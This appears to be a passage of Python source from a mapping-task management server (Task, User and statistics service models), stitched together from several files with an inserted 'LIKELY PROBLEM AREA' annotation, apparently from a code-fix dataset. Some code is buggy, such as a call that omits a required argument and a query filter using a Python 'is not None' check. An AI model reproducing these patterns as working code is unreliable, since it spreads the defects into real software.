    def get_last_mapped_action(project_id: int, task_id: int):
        """"""Gets the most recent mapped action, if any, in the task history""""""
        return db.session.query(TaskHistory) \
            .filter(TaskHistory.project_id == project_id,
                    TaskHistory.task_id == task_id,
                    TaskHistory.action == TaskAction.STATE_CHANGE.name,
                    TaskHistory.action_text.in_([TaskStatus.BADIMAGERY.name, TaskStatus.MAPPED.name])) \
            .order_by(TaskHistory.action_date.desc()).first()


class Task(db.Model):
    """""" Describes an individual mapping Task """"""
    __tablename__ = ""tasks""

    # Table has composite PK on (id and project_id)
    id = db.Column(db.Integer, primary_key=True)
    project_id = db.Column(db.Integer, db.ForeignKey('projects.id'), index=True, primary_key=True)
    x = db.Column(db.Integer)
    y = db.Column(db.Integer)
    zoom = db.Column(db.Integer)
    extra_properties = db.Column(db.Unicode)
    # Tasks need to be split differently if created from an arbitrary grid or were clipped to the edge of the AOI
    is_square = db.Column(db.Boolean, default=True)
    geometry = db.Column(Geometry('MULTIPOLYGON', srid=4326))
    task_status = db.Column(db.Integer, default=TaskStatus.READY.value)
    locked_by = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_users_locked'))
    mapped_by = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_users_mapper'))
    validated_by = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_users_validator'))

    # Mapped objects
    task_history = db.relationship(TaskHistory, cascade=""all"")
    task_annotations = db.relationship(TaskAnnotation, cascade=""all"")
    lock_holder = db.relationship(User, foreign_keys=[locked_by])
    mapper = db.relationship(User, foreign_keys=[mapped_by])

    def create(self):
        """""" Creates and saves the current model to the DB """"""
        db.session.add(self)
        db.session.commit()

    def update(self):
        """""" Updates the DB with the current state of the Task """"""
        db.session.commit()

    def delete(self):
        """""" Deletes the current model from the DB """"""
        db.session.delete(self)
        db.session.commit()

    @classmethod
    def from_geojson_feature(cls, task_id, task_feature):
        """"""
        Constructs and validates a task from a GeoJson feature object
        :param task_id: Unique ID for the task
        :param task_feature: A geoJSON feature object
        :raises InvalidGeoJson, InvalidData
        """"""
        if type(task_feature) is not geojson.Feature:
            raise InvalidGeoJson('Task: Invalid GeoJson should be a feature')

        task_geometry = task_feature.geometry

        if type(task_geometry) is not geojson.MultiPolygon:
            raise InvalidGeoJson('Task: Geometry must be a MultiPolygon')

        is_valid_geojson = geojson.is_valid(task_geometry)
        if is_valid_geojson['valid'] == 'no':
            raise InvalidGeoJson(f""Task: Invalid MultiPolygon - {is_valid_geojson['message']}"")

        task = cls()
        try:
            task.x = task_feature.properties['x']
            task.y = task_feature.properties['y']
            task.zoom = task_feature.properties['zoom']
            task.is_square = task_feature.properties['isSquare']
        except KeyError as e:
            raise InvalidData(f'Task: Expected property not found: {str(e)}')

        if 'extra_properties' in task_feature.properties:
            task.extra_properties = json.dumps(
                task_feature.properties['extra_properties'])

        task.id = task_id
        task_geojson = geojson.dumps(task_geometry)
        task.geometry = ST_SetSRID(ST_GeomFromGeoJSON(task_geojson), 4326)

        return task

    @staticmethod
    def get(task_id: int, project_id: int):
        """"""
        Gets specified task
        :param task_id: task ID in scope
        :param project_id: project ID in scope
        :return: Task if found otherwise None
        """"""
        # LIKELY PROBLEM AREA

        return Task.query.filter_by(id=task_id, project_id=project_id).one_or_none()

    @staticmethod
    def get_tasks(project_id: int, task_ids: List[int]):
        """""" Get all tasks that match supplied list """"""
        return Task.query.filter(Task.project_id == project_id, Task.id.in_(task_ids)).all()

    @staticmethod
    def get_all_tasks(project_id: int):
        """""" Get all tasks for a given project """"""
        return Task.query.filter(Task.project_id == project_id).all()

    @staticmethod
    def auto_unlock_delta():
      return parse_duration(current_app.config['TASK_AUTOUNLOCK_AFTER'])

    @staticmethod
    def auto_unlock_tasks(project_id: int):
        """"""Unlock all tasks locked for longer than the auto-unlock delta""""""
        expiry_delta = Task.auto_unlock_delta()
        lock_duration = (datetime.datetime.min + expiry_delta).time().isoformat()
        expiry_date = datetime.datetime.utcnow() - expiry_delta
        old_locks_query = '''SELECT t.id
            FROM tasks t, task_history th
            WHERE t.id = th.task_id
            AND t.project_id = th.project_id
            AND t.task_status IN (1,3)
            AND th.action IN ( 'LOCKED_FOR_VALIDATION','LOCKED_FOR_MAPPING' )
            AND th.action_text IS NULL
            AND t.project_id = :project_id
            AND th.action_date <= :expiry_date
            '''

        old_tasks = db.engine.execute(text(old_locks_query), project_id=project_id, expiry_date=str(expiry_date))

        if old_tasks.rowcount == 0:
            # no tasks older than the delta found, return without further processing
            return

        for old_task in old_tasks:
            task = Task.get(old_task[0], project_id)
            task.auto_unlock_expired_tasks(expiry_date, lock_duration)

    def auto_unlock_expired_tasks(self, expiry_date, lock_duration):
        """"""Unlock all tasks locked before expiry date. Clears task lock if needed""""""
        TaskHistory.update_expired_and_locked_actions(self.project_id, self.id, expiry_date, lock_duration)

        last_action = TaskHistory.get_last_locked_or_auto_unlocked_action(self.project_id, self.id)
        if last_action.action in ['AUTO_UNLOCKED_FOR_MAPPING', 'AUTO_UNLOCKED_FOR_VALIDATION']:
            self.clear_lock()

    def is_mappable(self):
        """""" Determines if task in scope is in suitable state for mapping """"""
        if TaskStatus(self.task_status) not in [TaskStatus.READY, TaskStatus.INVALIDATED]:
            return False

        return True

    def set_task_history(self, action, user_id, comment=None, new_state=None, mapping_issues=None):
        """"""
        Sets the task history for the action that the user has just performed
        :param task: Task in scope
        :param user_id: ID of user performing the action
        :param action: Action the user has performed
        :param comment: Comment user has added
        :param new_state: New state of the task
        :param mapping_issues: Identified issues leading to invalidation
        """"""
        history = TaskHistory(self.id, self.project_id, user_id)

        if action in [TaskAction.LOCKED_FOR_MAPPING, TaskAction.LOCKED_FOR_VALIDATION]:
            history.set_task_locked_action(action)
        elif action == TaskAction.COMMENT:
            history.set_comment_action(comment)
        elif action == TaskAction.STATE_CHANGE:
            history.set_state_change_action(new_state)
        elif action in [TaskAction.AUTO_UNLOCKED_FOR_MAPPING, TaskAction.AUTO_UNLOCKED_FOR_VALIDATION]:
            history.set_auto_unlock_action(action)

        if mapping_issues is not None:
            history.task_mapping_issues = mapping_issues

        self.task_history.append(history)
        return history

    def lock_task_for_mapping(self, user_id: int):
        self.set_task_history(TaskAction.LOCKED_FOR_MAPPING, user_id)
        self.task_status = TaskStatus.LOCKED_FOR_MAPPING.value
        self.locked_by = user_id
        self.update()

    def lock_task_for_validating(self, user_id: int):
        self.set_task_history(TaskAction.LOCKED_FOR_VALIDATION, user_id)
        self.task_status = TaskStatus.LOCKED_FOR_VALIDATION.value
        self.locked_by = user_id
        self.update()

    def reset_task(self, user_id: int):
        if TaskStatus(self.task_status) in [TaskStatus.LOCKED_FOR_MAPPING, TaskStatus.LOCKED_FOR_VALIDATION]:
            self.record_auto_unlock()

        self.set_task_history(TaskAction.STATE_CHANGE, user_id, None, TaskStatus.READY)
        self.mapped_by = None
        self.validated_by = None
        self.locked_by = None
        self.task_status = TaskStatus.READY.value
        self.update()

    def clear_task_lock(self):
        """"""
        Unlocks task in scope in the database.  Clears the lock as though it never happened.
        No history of the unlock is recorded.
        :return:
        """"""
        # clear the lock action for the task in the task history
        last_action = TaskHistory.get_last_locked_action(self.project_id, self.id)
        last_action.delete()

        # Set locked_by to null and status to last status on task
        self.clear_lock()

    def record_auto_unlock(self, lock_duration):
        locked_user = self.locked_by
        last_action = TaskHistory.get_last_locked_action(self.project_id, self.id)
        next_action = TaskAction.AUTO_UNLOCKED_FOR_MAPPING if last_action.action == 'LOCKED_FOR_MAPPING' \
            else TaskAction.AUTO_UNLOCKED_FOR_VALIDATION

        self.clear_task_lock()

        # Add AUTO_UNLOCKED action in the task history
        auto_unlocked = self.set_task_history(action=next_action, user_id=locked_user)
        auto_unlocked.action_text = lock_duration
        self.update()

    def unlock_task(self, user_id, new_state=None, comment=None, undo=False, issues=None):
        """""" Unlock task and ensure duration task locked is saved in History """"""
        if comment:
            self.set_task_history(action=TaskAction.COMMENT, comment=comment, user_id=user_id, mapping_issues=issues)

        history = self.set_task_history(action=TaskAction.STATE_CHANGE, new_state=new_state,
                                        user_id=user_id, mapping_issues=issues)

        if new_state in [TaskStatus.MAPPED, TaskStatus.BADIMAGERY] and TaskStatus(self.task_status) != TaskStatus.LOCKED_FOR_VALIDATION:
            # Don't set mapped if state being set back to mapped after validation
            self.mapped_by = user_id
        elif new_state == TaskStatus.VALIDATED:
            TaskInvalidationHistory.record_validation(self.project_id, self.id, user_id, history)
            self.validated_by = user_id
        elif new_state == TaskStatus.INVALIDATED:
            TaskInvalidationHistory.record_invalidation(self.project_id, self.id, user_id, history)
            self.mapped_by = None
            self.validated_by = None

        if not undo:
            # Using a slightly evil side effect of Actions and Statuses having the same name here :)
            TaskHistory.update_task_locked_with_duration(self.id, self.project_id, TaskStatus(self.task_status), user_id)

        self.task_status = new_state.value
        self.locked_by = None
        self.update()

    def reset_lock(self, user_id, comment=None):
        """""" Removes a current lock from a task, resets to last status and updates history with duration of lock """"""
        if comment:
            self.set_task_history(action=TaskAction.COMMENT, comment=comment, user_id=user_id)

        # Using a slightly evil side effect of Actions and Statuses having the same name here :)
        TaskHistory.update_task_locked_with_duration(self.id, self.project_id, TaskStatus(self.task_status), user_id)
        self.clear_lock()

    def clear_lock(self):
        """""" Resets to last status and removes current lock from a task """"""
        self.task_status = TaskHistory.get_last_status(self.project_id, self.id).value
        self.locked_by = None
        self.update()

    @staticmethod
    def get_tasks_as_geojson_feature_collection(project_id):
        """"""
        Creates a geoJson.FeatureCollection object for all tasks related to the supplied project ID
        :param project_id: Owning project ID
        :return: geojson.FeatureCollection
        """"""
        project_tasks = \
            db.session.query(Task.id, Task.x, Task.y, Task.zoom, Task.is_square, Task.task_status,
                             Task.geometry.ST_AsGeoJSON().label('geojson')).filter(Task.project_id == project_id).all()

        tasks_features = []
        for task in project_tasks:
            task_geometry = geojson.loads(task.geojson)
            task_properties = dict(taskId=task.id, taskX=task.x, taskY=task.y, taskZoom=task.zoom,
                                   taskIsSquare=task.is_square, taskStatus=TaskStatus(task.task_status).name)

            feature = geojson.Feature(geometry=task_geometry, properties=task_properties)
            tasks_features.append(feature)

        return geojson.FeatureCollection(tasks_features)

    @staticmethod
    def get_tasks_as_geojson_feature_collection_no_geom(project_id):
        """"""
        Creates a geoJson.FeatureCollection object for all tasks related to the supplied project ID without geometry
        :param project_id: Owning project ID
        :return: geojson.FeatureCollection
        """"""
        project_tasks = \
            db.session.query(Task.id, Task.x, Task.y, Task.zoom, Task.is_square, Task.task_status) \
                             .filter(Task.project_id == project_id).all()

        tasks_features = []
        for task in project_tasks:
            task_properties = dict(taskId=task.id, taskX=task.x, taskY=task.y, taskZoom=task.zoom,
                                   taskIsSquare=task.is_square, taskStatus=TaskStatus(task.task_status).name)

            feature = geojson.Feature(properties=task_properties)
            tasks_features.append(feature)

        return geojson.FeatureCollection(tasks_features)

    @staticmethod
    def get_mapped_tasks_by_user(project_id: int):
        """""" Gets all mapped tasks for supplied project grouped by user""""""

        # Raw SQL is easier to understand that SQL alchemy here :)
        sql = """"""select u.username, u.mapping_level, count(distinct(t.id)), json_agg(distinct(t.id)),
                            max(th.action_date) last_seen, u.date_registered, u.last_validation_date
                      from tasks t,
                           task_history th,
                           users u
                     where t.project_id = th.project_id
                       and t.id = th.task_id
                       and t.mapped_by = u.id
                       and t.project_id = :project_id
                       and t.task_status = 2
                       and th.action_text = 'MAPPED'
                     group by u.username, u.mapping_level, u.date_registered, u.last_validation_date""""""

        results = db.engine.execute(text(sql), project_id=project_id)
        if results.rowcount == 0:
            raise NotFound()

        mapped_tasks_dto = MappedTasks()
        for row in results:
            user_mapped = MappedTasksByUser()
            user_mapped.username = row[0]
            user_mapped.mapping_level = MappingLevel(row[1]).name
            user_mapped.mapped_task_count = row[2]
            user_mapped.tasks_mapped = row[3]
            user_mapped.last_seen = row[4]
            user_mapped.date_registered = row[5]
            user_mapped.last_validation_date = row[6]

            mapped_tasks_dto.mapped_tasks.append(user_mapped)

        return mapped_tasks_dto

    @staticmethod
    def get_max_task_id_for_project(project_id: int):
        """"""Gets the nights task id currently in use on a project""""""
        sql = """"""select max(id) from tasks where project_id = :project_id GROUP BY project_id""""""
        result = db.engine.execute(text(sql), project_id=project_id)
        if result.rowcount == 0:
            raise NotFound()
        for row in result:
            return row[0]

    def as_dto_with_instructions(self, preferred_locale: str = 'en') -> TaskDTO:
        """""" Get dto with any task instructions """"""
        task_history = []
        for action in self.task_history:
            history = TaskHistoryDTO()
            history.history_id = action.id
            history.action = action.action
            history.action_text = action.action_text
            history.action_date = action.action_date
            history.action_by = action.actioned_by.username if action.actioned_by else None
            if action.task_mapping_issues:
                history.issues = [issue.as_dto() for issue in action.task_mapping_issues]

            task_history.append(history)

        task_dto = TaskDTO()
        task_dto.task_id = self.id
        task_dto.project_id = self.project_id
        task_dto.task_status = TaskStatus(self.task_status).name
        task_dto.lock_holder = self.lock_holder.username if self.lock_holder else None
        task_dto.task_history = task_history
        task_dto.auto_unlock_seconds = Task.auto_unlock_delta().total_seconds()

        per_task_instructions = self.get_per_task_instructions(preferred_locale)

        # If we don't have instructions in preferred locale try again for default locale
        task_dto.per_task_instructions = per_task_instructions if per_task_instructions else self.get_per_task_instructions(
            self.projects.default_locale)

        annotations = self.get_per_task_annotations()
        task_dto.task_annotations = annotations if annotations else  [] 

        return task_dto

    def get_per_task_annotations(self):
        result = [ta.get_dto() for ta in self.task_annotations]
        return result

    def get_per_task_instructions(self, search_locale: str) -> str:
        """""" Gets any per task instructions attached to the project """"""
        project_info = self.projects.project_info.all()

        for info in project_info:
            if info.locale == search_locale:
                return self.format_per_task_instructions(info.per_task_instructions)

    def format_per_task_instructions(self, instructions) -> str:
        """""" Format instructions by looking for X, Y, Z tokens and replacing them with the task values """"""
        if not instructions:
            return ''  # No instructions so return empty string

        properties = {}

        if self.x:
            properties['x'] = str(self.x)
        if self.y:
            properties['y'] = str(self.y)
        if self.zoom:
            properties['z'] = str(self.zoom)
        if self.extra_properties:
            properties.update(json.loads(self.extra_properties))

        try:
            instructions = instructions.format(**properties)
        except KeyError:
            pass
        return instructions

    def copy_task_history(self) -> list:
        copies = []
        for entry in self.task_history:
            db.session.expunge(entry)
            make_transient(entry)
            entry.id = None
            entry.task_id = None
            db.session.add(entry)
            copies.append(entry)

        return copies
/n/n/nserver/models/postgis/user.py/n/nimport geojson
import datetime
import dateutil.parser
from server import db
from sqlalchemy import desc, text
from server.models.dtos.user_dto import UserDTO, UserMappedProjectsDTO, MappedProject, UserFilterDTO, Pagination, \
    UserSearchQuery, UserSearchDTO, ProjectParticipantUser, ListedUser
from server.models.postgis.licenses import License, users_licenses_table
from server.models.postgis.project_info import ProjectInfo
from server.models.postgis.statuses import MappingLevel, ProjectStatus, UserRole
from server.models.postgis.utils import NotFound, timestamp

class User(db.Model):
    """""" Describes the history associated with a task """"""
    __tablename__ = ""users""

    id = db.Column(db.BigInteger, primary_key=True, index=True)
    validation_message = db.Column(db.Boolean, default=True, nullable=False)
    username = db.Column(db.String, unique=True)
    role = db.Column(db.Integer, default=0, nullable=False)
    mapping_level = db.Column(db.Integer, default=1, nullable=False)
    projects_mapped = db.Column(db.Integer, default=1, nullable=False)
    tasks_mapped = db.Column(db.Integer, default=0, nullable=False)
    tasks_validated = db.Column(db.Integer, default=0, nullable=False)
    tasks_invalidated = db.Column(db.Integer, default=0, nullable=False)
    projects_mapped = db.Column(db.ARRAY(db.Integer))
    email_address = db.Column(db.String)
    is_email_verified = db.Column(db.Boolean, default=False)
    is_expert = db.Column(db.Boolean, default=False)
    twitter_id = db.Column(db.String)
    facebook_id = db.Column(db.String)
    linkedin_id = db.Column(db.String)
    date_registered = db.Column(db.DateTime, default=timestamp)
    # Represents the date the user last had one of their tasks validated
    last_validation_date = db.Column(db.DateTime, default=timestamp)

    # Relationships
    accepted_licenses = db.relationship(""License"", secondary=users_licenses_table)

    def create(self):
        """""" Creates and saves the current model to the DB """"""
        db.session.add(self)
        db.session.commit()

    def save(self):
        db.session.commit()

    def get_by_id(self, user_id: int):
        """""" Return the user for the specified id, or None if not found """"""
        return User.query.get(user_id)

    def get_by_username(self, username: str):
        """""" Return the user for the specified username, or None if not found """"""
        return User.query.filter_by(username=username).one_or_none()

    def update_username(self, username: str):
        """""" Update the username """"""
        self.username = username
        db.session.commit()

    def update(self, user_dto: UserDTO):
        """""" Update the user details """"""
        self.email_address = user_dto.email_address.lower() if user_dto.email_address else None
        self.twitter_id = user_dto.twitter_id.lower() if user_dto.twitter_id else None
        self.facebook_id = user_dto.facebook_id.lower() if user_dto.facebook_id else None
        self.linkedin_id = user_dto.linkedin_id.lower() if user_dto.linkedin_id else None
        self.validation_message = user_dto.validation_message
        db.session.commit()

    def set_email_verified_status(self, is_verified: bool):
        """""" Updates email verfied flag on successfully verified emails""""""
        self.is_email_verified = is_verified
        db.session.commit()

    def set_is_expert(self, is_expert: bool):
        """""" Enables or disables expert mode on the user""""""
        self.is_expert = is_expert
        db.session.commit()

    @staticmethod
    def get_all_users(query: UserSearchQuery) -> UserSearchDTO:
        """""" Search and filter all users """"""

        # Base query that applies to all searches
        base = db.session.query(User.id, User.username, User.mapping_level, User.role)

        # Add filter to query as required
        if query.mapping_level:
            base = base.filter(User.mapping_level == MappingLevel[query.mapping_level.upper()].value)
        if query.username:
            base = base.filter(User.username.ilike(query.username.lower() + '%'))
        if query.role:
            base = base.filter(User.role == UserRole[query.role.upper()].value)

        results = base.order_by(User.username).paginate(query.page, 20, True)

        dto = UserSearchDTO()
        for result in results.items:
            listed_user = ListedUser()
            listed_user.id = result.id
            listed_user.mapping_level = MappingLevel(result.mapping_level).name
            listed_user.username = result.username
            listed_user.role = UserRole(result.role).name

            dto.users.append(listed_user)

        dto.pagination = Pagination(results)
        return dto

    @staticmethod
    def get_all_users_not_pagainated():
        """""" Get all users in DB""""""
        return db.session.query(User.id).all()


    @staticmethod
    def filter_users(user_filter: str, project_id: int, page: int) -> UserFilterDTO:
        """""" Finds users that matches first characters, for auto-complete.

        Users who have participated (mapped or validated) in the project, if given, will be
        returned ahead of those who have not.
        """"""
        # Note that the projects_mapped column includes both mapped and validated projects.
        results = db.session.query(User.username, User.projects_mapped.any(project_id).label(""participant"")) \
            .filter(User.username.ilike(user_filter.lower() + '%')) \
            .order_by(desc(""participant"").nullslast(), User.username).paginate(page, 20, True)
        if results.total == 0:
            raise NotFound()

        dto = UserFilterDTO()
        for result in results.items:
            dto.usernames.append(result.username)
            if project_id is not None:
                participant = ProjectParticipantUser()
                participant.username = result.username
                participant.project_id = project_id
                participant.is_participant = bool(result.participant)
                dto.users.append(participant)

        dto.pagination = Pagination(results)
        return dto

    @staticmethod
    def upsert_mapped_projects(user_id: int, project_id: int):
        """""" Adds projects to mapped_projects if it doesn't exist """"""
        sql = ""select * from users where id = :user_id and projects_mapped @> '{{:project_id}}'""
        result = db.engine.execute(text(sql), user_id=user_id, project_id=project_id)

        if result.rowcount > 0:
            return  # User has previously mapped this project so return

        sql = '''update users
                    set projects_mapped = array_append(projects_mapped, :project_id)
                  where id = :user_id'''

        db.engine.execute(text(sql), project_id=project_id, user_id=user_id)

    @staticmethod
    def get_mapped_projects(user_id: int, preferred_locale: str) -> UserMappedProjectsDTO:
        """""" Get all projects a user has mapped on """"""

        # This query looks scary, but we're really just creating an outer join between the query that gets the
        # counts of all mapped tasks and the query that gets counts of all validated tasks.  This is necessary to
        # handle cases where users have only validated tasks on a project, or only mapped on a project.
        sql = '''SELECT p.id,
                        p.status,
                        p.default_locale,
                        c.mapped,
                        c.validated,
                        st_asgeojson(p.centroid)
                   FROM projects p,
                        (SELECT coalesce(v.project_id, m.project_id) project_id,
                                coalesce(v.validated, 0) validated,
                                coalesce(m.mapped, 0) mapped
                          FROM (SELECT t.project_id,
                                       count (t.validated_by) validated
                                  FROM tasks t
                                 WHERE t.project_id IN (SELECT unnest(projects_mapped) FROM users WHERE id = :user_id)
                                   AND t.validated_by = :user_id
                                 GROUP BY t.project_id, t.validated_by) v
                         FULL OUTER JOIN
                        (SELECT t.project_id,
                                count(t.mapped_by) mapped
                           FROM tasks t
                          WHERE t.project_id IN (SELECT unnest(projects_mapped) FROM users WHERE id = :user_id)
                            AND t.mapped_by = :user_id
                          GROUP BY t.project_id, t.mapped_by) m
                         ON v.project_id = m.project_id) c
                   WHERE p.id = c.project_id ORDER BY p.id DESC'''

        results = db.engine.execute(text(sql), user_id=user_id)

        if results.rowcount == 0:
            raise NotFound()

        mapped_projects_dto = UserMappedProjectsDTO()
        for row in results:
            mapped_project = MappedProject()
            mapped_project.project_id = row[0]
            mapped_project.status = ProjectStatus(row[1]).name
            mapped_project.tasks_mapped = row[3]
            mapped_project.tasks_validated = row[4]
            mapped_project.centroid = geojson.loads(row[5])

            project_info = ProjectInfo.get_dto_for_locale(row[0], preferred_locale, row[2])
            mapped_project.name = project_info.name

            mapped_projects_dto.mapped_projects.append(mapped_project)

        return mapped_projects_dto

    def set_user_role(self, role: UserRole):
        """""" Sets the supplied role on the user """"""
        self.role = role.value
        db.session.commit()

    def set_mapping_level(self, level: MappingLevel):
        """""" Sets the supplied level on the user """"""
        self.mapping_level = level.value
        db.session.commit()

    def accept_license_terms(self, license_id: int):
        """""" Associate the user in scope with the supplied license """"""
        image_license = License.get_by_id(license_id)
        self.accepted_licenses.append(image_license)
        db.session.commit()

    def has_user_accepted_licence(self, license_id: int):
        """""" Test to see if the user has accepted the terms of the specified license""""""
        image_license = License.get_by_id(license_id)

        if image_license in self.accepted_licenses:
            return True

        return False

    def delete(self):
        """""" Delete the user in scope from DB """"""
        db.session.delete(self)
        db.session.commit()

    def as_dto(self, logged_in_username: str) -> UserDTO:
        """""" Create DTO object from user in scope """"""
        user_dto = UserDTO()
        user_dto.id = self.id
        user_dto.username = self.username
        user_dto.role = UserRole(self.role).name
        user_dto.mapping_level = MappingLevel(self.mapping_level).name
        user_dto.is_expert = self.is_expert or False
        user_dto.date_registered = str(self.date_registered)
        try:
            user_dto.projects_mapped = len(self.projects_mapped)
        # Handle users that haven't touched a project yet.
        except:
            user_dto.projects_mapped = 0
        user_dto.tasks_mapped = self.tasks_mapped
        user_dto.tasks_validated = self.tasks_validated
        user_dto.tasks_invalidated = self.tasks_invalidated
        user_dto.twitter_id = self.twitter_id
        user_dto.linkedin_id = self.linkedin_id
        user_dto.facebook_id = self.facebook_id
        user_dto.validation_message = self.validation_message
        user_dto.total_time_spent = 0
        user_dto.time_spent_mapping = 0
        user_dto.time_spent_validating = 0

        sql = """"""SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history
                WHERE action='LOCKED_FOR_VALIDATION'
                and user_id = :user_id;""""""
        total_validation_time = db.engine.execute(text(sql), user_id=self.id)
        for row in total_validation_time:
            total_validation_time = row[0]
            if total_validation_time:
                total_validation_seconds = total_validation_time.total_seconds()
                user_dto.time_spent_validating = total_validation_seconds
                user_dto.total_time_spent += user_dto.time_spent_validating

        sql = """"""SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history
                WHERE action='LOCKED_FOR_MAPPING'
                and user_id = :user_id;""""""
        total_mapping_time = db.engine.execute(text(sql), user_id=self.id)
        for row in total_mapping_time:
            total_mapping_time = row[0]
            if total_mapping_time:
                total_mapping_seconds = total_mapping_time.total_seconds()
                user_dto.time_spent_mapping = total_mapping_seconds
                user_dto.total_time_spent += user_dto.time_spent_mapping

        if self.username == logged_in_username:
            # Only return email address when logged in user is looking at their own profile
            user_dto.email_address = self.email_address
            user_dto.is_email_verified = self.is_email_verified
        return user_dto
/n/n/nserver/services/stats_service.py/n/nfrom cachetools import TTLCache, cached

from sqlalchemy import func, text
from server import db
from server.models.dtos.stats_dto import (
    ProjectContributionsDTO, UserContribution, Pagination, TaskHistoryDTO,
    ProjectActivityDTO, HomePageStatsDTO, OrganizationStatsDTO,
    CampaignStatsDTO
    )
from server.models.postgis.project import Project
from server.models.postgis.statuses import TaskStatus
from server.models.postgis.task import TaskHistory, User, Task
from server.models.postgis.utils import timestamp, NotFound
from server.services.project_service import ProjectService
from server.services.users.user_service import UserService


homepage_stats_cache = TTLCache(maxsize=4, ttl=30)


class StatsService:

    @staticmethod
    def update_stats_after_task_state_change(project_id: int, user_id: int, last_state: TaskStatus,
                                             new_state: TaskStatus, action='change'):
        """""" Update stats when a task has had a state change """"""

        if new_state in [TaskStatus.READY, TaskStatus.LOCKED_FOR_VALIDATION, TaskStatus.LOCKED_FOR_MAPPING]:
            return  # No stats to record for these states

        project = ProjectService.get_project_by_id(project_id)
        user = UserService.get_user_by_id(user_id)

        StatsService._update_tasks_stats(project, user, last_state, new_state, action)
        UserService.upsert_mapped_projects(user_id, project_id)
        project.last_updated = timestamp()

        # Transaction will be saved when task is saved
        return project, user

    @staticmethod
    def _update_tasks_stats(project: Project, user: User, last_state: TaskStatus, new_state: TaskStatus,
                            action='change'):

        # Make sure you are aware that users table has it as incrementing counters,
        # while projects table reflect the actual state, and both increment and decrement happens

        # Set counters for new state
        if new_state == TaskStatus.MAPPED:
            project.tasks_mapped += 1
        elif new_state == TaskStatus.VALIDATED:
            project.tasks_validated += 1
        elif new_state == TaskStatus.BADIMAGERY:
            project.tasks_bad_imagery += 1

        if action == 'change':
            if new_state == TaskStatus.MAPPED:
                user.tasks_mapped += 1
            elif new_state == TaskStatus.VALIDATED:
                user.tasks_validated += 1
            elif new_state == TaskStatus.INVALIDATED:
                user.tasks_invalidated += 1

        # Remove counters for old state
        if last_state == TaskStatus.MAPPED:
            project.tasks_mapped -= 1
        elif last_state == TaskStatus.VALIDATED:
            project.tasks_validated -= 1
        elif last_state == TaskStatus.BADIMAGERY:
            project.tasks_bad_imagery -= 1

        if action == 'undo':
            if last_state == TaskStatus.MAPPED:
                user.tasks_mapped -= 1
            elif last_state == TaskStatus.VALIDATED:
                user.tasks_validated -= 1
            elif last_state == TaskStatus.INVALIDATED:
                user.tasks_invalidated -= 1

    @staticmethod
    def get_latest_activity(project_id: int, page: int) -> ProjectActivityDTO:
        """""" Gets all the activity on a project """"""

        results = db.session.query(
                TaskHistory.id, TaskHistory.task_id, TaskHistory.action, TaskHistory.action_date,
                TaskHistory.action_text, User.username
            ).join(User).filter(
                TaskHistory.project_id == project_id,
                TaskHistory.action != 'COMMENT'
            ).order_by(
                TaskHistory.action_date.desc()
            ).paginate(page, 10, True)

        if results.total == 0:
            raise NotFound()

        activity_dto = ProjectActivityDTO()
        for item in results.items:
            history = TaskHistoryDTO()
            history.history_id = item.id
            history.task_id = item.task_id
            history.action = item.action
            history.action_text = item.action_text
            history.action_date = item.action_date
            history.action_by = item.username
            activity_dto.activity.append(history)

        activity_dto.pagination = Pagination(results)
        return activity_dto

    @staticmethod
    def get_user_contributions(project_id: int) -> ProjectContributionsDTO:
        """""" Get all user contributions on a project""""""
        contrib_query = '''select m.mapped_by, m.username, m.mapped, v.validated_by, v.username, v.validated
                             from (select t.mapped_by, u.username, count(t.mapped_by) mapped
                                     from tasks t,
                                          users u
                                    where t.mapped_by = u.id
                                      and t.project_id = :project_id
                                      and t.mapped_by is not null
                                    group by t.mapped_by, u.username) m FULL OUTER JOIN
                                  (select t.validated_by, u.username, count(t.validated_by) validated
                                     from tasks t,
                                          users u
                                    where t.validated_by = u.id
                                      and t.project_id = :project_id
                                      and t.validated_by is not null
                                    group by t.validated_by, u.username) v
                                       ON m.mapped_by = v.validated_by
        '''

        results = db.engine.execute(text(contrib_query), project_id=project_id)
        if results.rowcount == 0:
            raise NotFound()

        contrib_dto = ProjectContributionsDTO()
        for row in results:
            user_id = row[0] or row[3]
            user_contrib = UserContribution()
            user_contrib.username = row[1] if row[1] else row[4]
            user_contrib.mapped = row[2] if row[2] else 0
            user_contrib.validated = row[5] if row[5] else 0
            contrib_dto.user_contributions.append(user_contrib)
        return contrib_dto

    @staticmethod
    @cached(homepage_stats_cache)
    def get_homepage_stats() -> HomePageStatsDTO:
        """""" Get overall TM stats to give community a feel for progress that's being made """"""
        dto = HomePageStatsDTO()

        dto.total_projects = Project.query.count()
        dto.mappers_online = Task.query.filter(
            Task.locked_by is not None
            ).distinct(Task.locked_by).count()
        dto.total_mappers = User.query.count()
        dto.total_validators = Task.query.filter(
            Task.task_status == TaskStatus.VALIDATED.value
            ).distinct(Task.validated_by).count()
        dto.tasks_mapped = Task.query.filter(
            Task.task_status.in_(
                (TaskStatus.MAPPED.value, TaskStatus.VALIDATED.value)
                )
            ).count()
        dto.tasks_validated = Task.query.filter(
            Task.task_status == TaskStatus.VALIDATED.value
            ).count()

        org_proj_count = db.session.query(
            Project.organisation_tag,
            func.count(Project.organisation_tag)
        ).group_by(Project.organisation_tag).all()

        untagged_count = 0

        # total_area = 0



       # dto.total_area = 0

        # total_area_sql = """"""select sum(ST_Area(geometry)) from public.projects as area""""""

        # total_area_result = db.engine.execute(total_area_sql)
        # current_app.logger.debug(total_area_result)
        # for rowproxy in total_area_result:
            # rowproxy.items() returns an array like [(key0, value0), (key1, value1)]
            # for tup in rowproxy.items():
                # total_area += tup[1]
                # current_app.logger.debug(total_area)
        # dto.total_area = total_area

        tasks_mapped_sql = ""select coalesce(sum(ST_Area(geometry)), 0) as sum from public.tasks where task_status = :task_status""
        tasks_mapped_result = db.engine.execute(text(tasks_mapped_sql), task_status=TaskStatus.MAPPED.value)

        dto.total_mapped_area = tasks_mapped_result.fetchone()['sum']

        tasks_validated_sql = ""select coalesce(sum(ST_Area(geometry)), 0) as sum from public.tasks where task_status = :task_status""
        tasks_validated_result = db.engine.execute(text(tasks_validated_sql), task_status=TaskStatus.VALIDATED.value)

        dto.total_validated_area = tasks_validated_result.fetchone()['sum']

        campaign_count = db.session.query(Project.campaign_tag, func.count(Project.campaign_tag))\
